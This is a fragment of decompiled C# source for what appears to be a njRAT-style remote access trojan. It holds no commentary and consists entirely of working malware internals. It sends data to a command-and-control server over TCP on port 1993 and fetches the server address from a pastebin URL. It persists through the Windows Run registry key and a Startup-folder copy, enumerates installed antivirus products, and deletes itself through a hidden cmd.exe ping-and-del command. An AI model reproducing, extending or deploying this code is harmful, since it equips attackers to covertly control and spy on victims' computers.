			{
				try
				{
					object lo = OK.LO;
					lock (lo)
					{
						if (!OK.Cn)
						{
							return false;
						}
						MemoryStream memoryStream = new MemoryStream();
						string text = b.Length.ToString() + "\0";
						byte[] array = OK.SB(ref text);
						memoryStream.Write(array, 0, array.Length);
						memoryStream.Write(b, 0, b.Length);
						OK.C.Client.Send(memoryStream.ToArray(), 0, checked((int)memoryStream.Length), SocketFlags.None);
					}
				}
				catch (Exception ex)
				{
					try
					{
						if (OK.Cn)
						{
							OK.Cn = false;
							OK.C.Close();
						}
					}
					catch (Exception ex2)
					{
					}
				}
				result = OK.Cn;
			}
			return result;
		}

		// Token: 0x0600002C RID: 44 RVA: 0x000045FC File Offset: 0x000027FC
		public static bool STV(string n, object t, RegistryValueKind typ)
		{
			bool result;
			try
			{
				OK.F.Registry.CurrentUser.CreateSubKey("Software\\" + OK.RG).SetValue(n, RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(t)), typ);
				result = true;
			}
			catch (Exception ex)
			{
				result = false;
			}
			return result;
		}

		// Token: 0x0600002D RID: 45 RVA: 0x00004670 File Offset: 0x00002870
		public static string HOST()
		{
			return new WebClient().DownloadString("https://pastebin.com/raw/tYFULNB5");
		}

		// Token: 0x0600002E RID: 46 RVA: 0x00004684 File Offset: 0x00002884
		[MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
		public static void UNS()
		{
			OK.pr(0);
			OK.Isu = false;
			try
			{
				OK.F.Registry.CurrentUser.OpenSubKey(OK.sf, true).DeleteValue(OK.RG, false);
			}
			catch (Exception ex)
			{
			}
			try
			{
				OK.F.Registry.LocalMachine.OpenSubKey(OK.sf, true).DeleteValue(OK.RG, false);
			}
			catch (Exception ex2)
			{
			}
			try
			{
				if (OK.FS != null)
				{
					OK.FS.Dispose();
					File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + OK.RG + ".exe");
				}
			}
			catch (Exception ex3)
			{
			}
			try
			{
				OK.F.Registry.CurrentUser.OpenSubKey("Software", true).DeleteSubKey(OK.RG, false);
			}
			catch (Exception ex4)
			{
			}
			try
			{
				Interaction.Shell("cmd.exe /c ping 0 -n 2 & del \"" + OK.LO.FullName + "\"", AppWinStyle.Hide, false, -1);
			}
			catch (Exception ex5)
			{
			}
			ProjectData.EndApp();
		}

		// Token: 0x0600002F RID: 47 RVA: 0x00004830 File Offset: 0x00002A30
		public static byte[] ZIP(byte[] B)
		{
			MemoryStream memoryStream = new MemoryStream(B);
			GZipStream gzipStream = new GZipStream(memoryStream, CompressionMode.Decompress);
			byte[] array = new byte[4];
			checked
			{
				memoryStream.Position = memoryStream.Length - 5L;
				memoryStream.Read(array, 0, 4);
				int num = BitConverter.ToInt32(array, 0);
				memoryStream.Position = 0L;
				byte[] array2 = new byte[num - 1 + 1 - 1 + 1];
				gzipStream.Read(array2, 0, num);
				gzipStream.Dispose();
				memoryStream.Dispose();
				return array2;
			}
		}

		// Token: 0x06000030 RID: 48 RVA: 0x000048A8 File Offset: 0x00002AA8
		public static string GetAV(string Product)
		{
			string result;
			try
			{
				string text = string.Empty;
				try
				{
					foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher("root\\SecurityCenter" + Interaction.IIf(OK.DI.OSFullName.Contains("XP"), "", "2").ToString(), Product).Get())
					{
						ManagementObject managementObject = (ManagementObject)managementBaseObject;
						text = text + managementObject["displayName"].ToString() + ".";
					}
				}
				finally
				{
					ManagementObjectCollection.ManagementObjectEnumerator enumerator;
					if (enumerator != null)
					{
						((IDisposable)enumerator).Dispose();
					}
				}
				if (Operators.CompareString(text, string.Empty, false) != 0)
				{
					result = text;
				}
				else
				{
					result = "NOTHING";
				}
			}
			catch (Exception ex)
			{
				result = "NOTHING";
			}
			return result;
		}

		// Token: 0x04000006 RID: 6
		public static ComputerInfo DI = new ComputerInfo();

		// Token: 0x04000007 RID: 7
		public static byte[] b = new byte[5121];

		// Token: 0x04000008 RID: 8
		public static bool BD = Conversions.ToBoolean("false");

		// Token: 0x04000009 RID: 9
		public static TcpClient C = null;

		// Token: 0x0400000A RID: 10
		public static bool Cn = false;

		// Token: 0x0400000B RID: 11
		public static string DR = "TM";

		// Token: 0x0400000C RID: 12
		public static string EXE = "I.exe";

		// Token: 0x0400000D RID: 13
		public static Computer F = new Computer();

		// Token: 0x0400000E RID: 14
		public static FileStream FS;

		// Token: 0x0400000F RID: 15
		public static string H = "";

		// Token: 0x04000010 RID: 16
		public static bool Idr = Conversions.ToBoolean("false");

		// Token: 0x04000011 RID: 17
		public static bool IsF = Conversions.ToBoolean("false");

		// Token: 0x04000012 RID: 18
		public static bool Isu = Conversions.ToBoolean("false");

		// Token: 0x04000013 RID: 19
		public static string lastcap = "";

		// Token: 0x04000014 RID: 20
		public static FileInfo LO = new FileInfo(Application.ExecutablePath);

		// Token: 0x04000015 RID: 21
		public static MemoryStream MeM = new MemoryStream();

		// Token: 0x04000016 RID: 22
		public static object MT = null;

		// Token: 0x04000017 RID: 23
		public static string P = "1993";

		// Token: 0x04000018 RID: 24
		public static object PLG = null;

		// Token: 0x04000019 RID: 25
		public static string RG = "[RG]";

		// Token: 0x0400001A RID: 26
		public static string sf = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";

		// Token: 0x0400001B RID: 27
		public static string VN = "[VN]";

		// Token: 0x0400001C RID: 28
		public static string VR = OK.GetAV("Select * from AntiVirusProduct");

		// Token: 0x0400001D RID: 29
		public static string Y = "devx";
	}
}
